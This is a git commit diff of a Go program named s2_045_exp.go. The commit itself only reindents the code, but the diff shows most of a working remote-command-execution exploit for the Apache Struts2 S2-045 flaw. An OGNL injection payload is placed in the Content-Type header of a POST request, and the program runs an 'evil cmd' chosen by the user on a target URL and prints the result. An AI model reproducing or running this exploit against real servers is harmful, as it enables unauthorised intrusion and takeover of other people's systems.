827b8ef44f7bb444a5427066d0c326e38b1181d5
ev3rs0u1 <645298099@qq.com>
2017-03-08 21:53:50 +0800

    Update s2_045_exp.go

--- s2_045_exp.go
+++ s2_045_exp.go
@@ -11,9 +11,9 @@ import (
 
 var (
     vv  bool
-	url string
-	cmd string
-	payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
+    url string
+    cmd string
+    payload = "%{(#nike='multipart/form-data').(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS)." +
     "(#_memberAccess?(#_memberAccess=#dm):((#container=#context['com.opensymphony.xwork2.ActionContext.container'])." +
     "(#ognlUtil=#container.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class))." +
     "(#ognlUtil.getExcludedPackageNames().clear()).(#ognlUtil.getExcludedClasses().clear())." +
@@ -24,26 +24,26 @@ var (
 )
 
 func catch() {
-	if err := recover(); err != nil {
-		fmt.Println("[-]", err)
-	}
+    if err := recover(); err != nil {
+        fmt.Println("[-]", err)
+    }
 }
 
 func evilCmd(url string, cmd string) {
     defer catch()
-	initPayload := strings.Replace(payload, "fuck", cmd, -1)
-	timeout := time.Duration(5 * time.Second)
-	client := &http.Client{Timeout: timeout}
-	req, _ := http.NewRequest("POST", url, nil)
-	req.Header.Add("User-Agent", "WTF/1.0")
-	req.Header.Add("Content-Type", initPayload)
-	res, err := client.Do(req)
+    initPayload := strings.Replace(payload, "fuck", cmd, -1)
+    timeout := time.Duration(5 * time.Second)
+    client := &http.Client{Timeout: timeout}
+    req, _ := http.NewRequest("POST", url, nil)
+    req.Header.Add("User-Agent", "WTF/1.0")
+    req.Header.Add("Content-Type", initPayload)
+    res, err := client.Do(req)
     if err != nil { panic("URL connection failed") }
     defer res.Body.Close()
-	bodyBytes, _ := ioutil.ReadAll(res.Body)
+    bodyBytes, _ := ioutil.ReadAll(res.Body)
     bodyString := string(bodyBytes)
-	exist := strings.Contains(bodyString, "</html>")
-	if (res.StatusCode == http.StatusOK) && (!exist) {
+    exist := strings.Contains(bodyString, "</html>")
+    if (res.StatusCode == http.StatusOK) && (!exist) {
         fmt.Println("[+]", "target is vulnerable")
         if vv {
             for k, v := range res.Header {
@@ -51,19 +51,19 @@ func evilCmd(url string, cmd string) {
             }
         }
         fmt.Printf("\n%s", bodyString)
-	} else {
-		panic("exploit failed")
-	}
+    } else {
+        panic("exploit failed")
+    }
 }
 
 func main() {
     flag.BoolVar(&vv, "vv", false, "show details")
-	flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
-	flag.StringVar(&url, "url", "", "target URL (e.g. \"http://www.site.com/index.action\")")
-	flag.Parse()
-	if len(url) > 0 && len(cmd) > 0 {
-		evilCmd(url, cmd)
-	} else {
-		flag.Usage()
-	}
+    flag.StringVar(&cmd, "cmd", "whoami", "exec evil cmd")
+    flag.StringVar(&url, "url", "", "target URL (e.g. \"http://www.site.com/index.action\")")
+    flag.Parse()
+    if len(url) > 0 && len(cmd) > 0 {
+        evilCmd(url, cmd)
+    } else {
+        flag.Usage()
+    }
 }
